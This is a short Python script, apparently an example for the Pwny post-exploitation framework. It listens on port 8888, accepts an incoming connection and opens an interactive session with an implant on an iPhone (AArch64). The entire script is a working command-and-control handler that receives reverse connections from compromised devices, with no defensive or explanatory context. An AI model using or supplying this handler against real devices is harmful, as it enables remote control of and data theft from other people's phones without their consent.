import socket

from pex.arch.types import *
from pex.platform.types import *

from pwny.session import PwnySession

s = socket.socket()
s.bind(('0.0.0.0', 8888))
s.listen()
c, a = s.accept()

p = PwnySession()
p.details['Platform'] = OS_IPHONE
p.details['Arch'] = ARCH_AARCH64
p.open(c, loader=False)
p.interact()
